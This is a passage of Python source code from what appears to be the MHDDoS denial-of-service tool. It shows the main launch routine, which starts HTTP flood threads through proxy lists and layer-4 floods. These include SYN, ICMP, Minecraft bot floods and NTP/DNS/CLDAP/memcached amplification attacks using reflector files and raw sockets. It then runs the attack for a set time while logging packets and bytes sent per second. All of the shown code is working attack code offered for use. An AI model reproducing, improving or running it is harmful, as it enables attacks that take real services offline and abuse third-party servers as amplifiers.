                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Thread is higher than 1000")
                if rpc > 100:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 100")

                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                for thread_id in range(threads):
                    HttpFlood(thread_id, url, host, method, rpc, event,
                              uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)

                port = target.port
                target = target.host

                try:
                    target = gethostbyname(target)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                if method in Methods.LAYER4_AMP:
                    logger.warning("this method need spoofable servers please check")
                    logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                ref = None

                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if method in {"SYN", "ICMP"}:
                    __ip__ = __ip__

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        refl_li = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                                      for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref: exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_ty = int(argfive)
                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                            proxies = handleProxyList(con, proxy_li, proxy_ty)
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")
                
                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                        Tools.send(s, Minecraft.data(b'\x00'))

                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                        
                        if 47 < protocolid > 758:
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                for _ in range(threads):
                    Layer4((target, port), ref, method, event,
                           proxies, protocolid).start()

            logger.info(
                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            while time() < ts + timer:
                logger.debug(
                    f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                    (target or url.host,
                     port or (url.port or 80),
                     method,
                     Tools.humanformat(int(REQUESTS_SENT)),
                     Tools.humanbytes(int(BYTES_SEND)),
                     round((time() - ts) / timer * 100, 2)))
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            event.clear()
            exit()

        ToolsConsole.usage()
